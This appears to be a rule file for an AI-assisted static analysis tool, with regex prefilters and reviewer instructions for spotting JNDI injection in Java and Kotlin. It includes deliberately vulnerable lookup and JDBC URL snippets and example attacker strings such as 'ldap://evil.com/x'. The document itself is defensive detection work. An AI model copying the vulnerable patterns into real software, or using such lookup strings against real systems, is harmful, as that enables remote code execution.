---
slug: jndi-injection
name: JNDI Injection
description: 'User-controlled strings passed to InitialContext.lookup(), JndiTemplate.lookup(), or JDBC connection URLs — allows attacker-controlled LDAP/RMI endpoints to deliver malicious deserialized objects or load remote classes, leading to RCE.'
version: 0.1.0
author: agentgg
noiseTier: normal
precondition:
  regex:
    patterns:
      - regex: 'import\s+javax\.naming\.(InitialContext|Context|directory)'
        in:
          - '**/*.{java,kt}'
        notIn:
          - '**/src/test/**'
          - '**/test/**'
          - '**/target/**'
          - '**/build/**'
        label: javax.naming import (JNDI in use)
      - regex: 'new\s+InitialContext\s*\(\s*\)'
        in:
          - '**/*.{java,kt}'
        notIn:
          - '**/src/test/**'
          - '**/test/**'
          - '**/target/**'
          - '**/build/**'
        label: InitialContext instantiation
      - regex: 'DriverManager\.getConnection\s*\(\s*[^")][^)]*\)'
        in:
          - '**/*.{java,kt}'
        notIn:
          - '**/src/test/**'
          - '**/test/**'
          - '**/target/**'
          - '**/build/**'
        label: DriverManager.getConnection with variable URL (not string literal)
      - regex: '(dataSource|DataSource)\s*\.\s*setUrl\s*\('
        in:
          - '**/*.{java,kt}'
        notIn:
          - '**/src/test/**'
          - '**/test/**'
          - '**/target/**'
          - '**/build/**'
        label: DataSource.setUrl with variable
      - regex: 'JndiTemplate\s*\(\)|jndiTemplate\.(lookup|getObject)\s*\('
        in:
          - '**/*.{java,kt}'
        notIn:
          - '**/src/test/**'
          - '**/test/**'
          - '**/target/**'
          - '**/build/**'
        label: Spring JndiTemplate lookup
where:
  extensions:
    - java
    - kt
  excludePatterns:
    - '**/src/test/**'
    - '**/test/**'
    - '**/target/**'
    - '**/build/**'
  preFilter:
    - regex: 'new\s+InitialContext\s*\(\s*\)'
      label: InitialContext instantiation
    - regex: 'import\s+javax\.naming\.(InitialContext|Context|directory)'
      label: javax.naming import (JNDI in use)
    - regex: 'DriverManager\.getConnection\s*\(\s*[^")][^)]*\)'
      label: DriverManager.getConnection with variable URL (not string literal)
    - regex: '(dataSource|DataSource)\s*\.\s*setUrl\s*\('
      label: DataSource.setUrl with variable
    - regex: 'JndiTemplate\s*\(\)|jndiTemplate\.(lookup|getObject)\s*\('
      label: Spring JndiTemplate lookup
  maxFilesPerBatch: 5
  maxTurnsPerBatch: 30
references:
  - CWE-74
  - CWE-502
  - 'OWASP-A03:2021'
---

You are reviewing JVM source code (Java / Kotlin) for JNDI injection —
user-controlled strings reaching a JNDI lookup or a JDBC connection URL
that accepts JNDI-backed connection parameters. An attacker who controls
the lookup name can point it to an attacker-operated LDAP or RMI server
that delivers a malicious serialized object, leading to Remote Code
Execution via Java gadget chains.

This vulnerability is widespread because JNDI lookup is used legitimately
for service discovery (data sources, mail sessions, EJBs), so the API
is present in many enterprise codebases. The injection occurs when the
lookup name comes from user-controlled input rather than a fixed name in
application configuration.

**JDBC variant:** JDBC drivers that support JNDI-based connection pools
(DB2, Sybase, some Oracle configs) accept `ldap://` or `rmi://` prefixes
inside the connection URL, turning `DriverManager.getConnection(userUrl)`
into a JNDI lookup. An authenticated user who can supply or update the
JDBC URL for a data store connection can trigger this path.

**Cross-file analysis:** the lookup name is often assembled or retrieved
several hops from the request. A REST endpoint stores the JDBC URL into a
data-store config record; another code path reads the record and calls
`getConnection`. Trace the value to confirm the trust boundary.

## What to look for

**Direct InitialContext.lookup with user input:**
```java
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup(request.getParameter("resource"));  // "ldap://evil.com/x"

// Assembled from request parts
String name = "java:comp/env/" + userSuppliedSuffix;
ctx.lookup(name);
```

**Spring JndiTemplate:**
```java
JndiTemplate jndi = new JndiTemplate();
DataSource ds = (DataSource) jndi.lookup(userJndiName);
```

**JDBC URL injection:**
```java
// User supplies the full JDBC URL — DB2/Sybase allow ldap:// prefix
String url = request.getParameter("jdbcUrl");
Connection conn = DriverManager.getConnection(url, user, pass);

// User supplies connection parameters that are merged into a URL
String dsUrl = "jdbc:db2://" + host + ":" + port + "/" + dbName
             + ":retrieveMessagesFromServerOnGetMessage=true;"
             + extraParams;      // extraParams from user request
ds.setUrl(dsUrl);
Connection conn = ds.getConnection();
```

**DataSource configured from user input:**
```java
BasicDataSource ds = new BasicDataSource();
ds.setUrl(connectionConfig.getUrl());      // URL written by an admin user through UI
ds.setDriverClassName(connectionConfig.getDriver());
Connection conn = ds.getConnection();      // JNDI lookup can be embedded in URL
```

## True positive criteria

Flag when ANY of the following hold AND the value is traceable to user-
controlled input (request parameter, body field, URL, or a database record
that the user can write):

1. `context.lookup(name)` / `InitialContext.lookup(name)` where `name`
   is not a compile-time constant.
2. `jndiTemplate.lookup(name, ...)` / `jndiTemplate.getObject(name, ...)`.
3. `DriverManager.getConnection(url, ...)` where `url` contains or is
   entirely a user-controlled value (look for concatenation, or the URL
   being read from a user-editable config record).
4. `dataSource.setUrl(url)` + `dataSource.getConnection()` where `url`
   originates from user input.

## What to ignore

- `ctx.lookup("java:comp/env/jdbc/myDS")` — hardcoded constant name.
  The name is controlled by the application deployer, not an end user.
- JNDI names assembled entirely from application-managed identifiers (e.g.,
  a fixed prefix + an internal DB-assigned integer ID the user cannot choose).
- `DriverManager.getConnection(url, ...)` where `url` is from a
  configuration file or environment variable that only operators can set.
- Test code under `src/test/`.

## Examples

True positives:
```java
// Admin can supply any JDBC URL — DB2 driver passes it to JNDI
String url = adminRequest.getJdbcUrl();
Connection conn = DriverManager.getConnection(url);  // ldap://attacker/Exploit

// Direct lookup from request
InitialContext ctx = new InitialContext();
ctx.lookup(req.getParameter("service"));

// Suffix from user request appended to fixed prefix
String name = "java:/" + request.getParameter("datasource");
ctx.lookup(name);
```

False positives to skip:
```java
// Fully constant — safe
ctx.lookup("java:comp/env/jdbc/appDB");

// Operator-controlled environment variable, not user input
String dsName = System.getenv("JNDI_DATASOURCE");
ctx.lookup(dsName);

// Integer ID from server-assigned record — no protocol-injection possible
int id = record.getId();
ctx.lookup("java:comp/env/pool/" + id);
```

If a user-supplied string flows into a JNDI lookup or a JDBC URL without
strict validation that the scheme is not `ldap://`, `ldaps://`, `rmi://`,
`iiop://`, or `dns://`, treat it as a finding.
